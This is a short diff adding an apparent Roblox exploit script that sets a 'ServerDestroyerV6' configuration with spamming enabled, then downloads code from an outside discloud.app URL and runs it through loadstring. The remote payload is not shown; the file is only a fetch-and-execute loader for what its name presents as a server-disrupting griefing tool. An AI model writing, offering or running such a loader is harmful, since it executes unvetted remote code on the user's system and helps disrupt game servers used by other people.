@@ -1,0 +1,6 @@
+getgenv().ServerDestroyerV6 = {
+    Comprar = false,
+    Spam = true
+}
+
+loadstring(game:HttpGet("https://tcscripts.discloud.app/scripts/serverdestroyerv6"))()
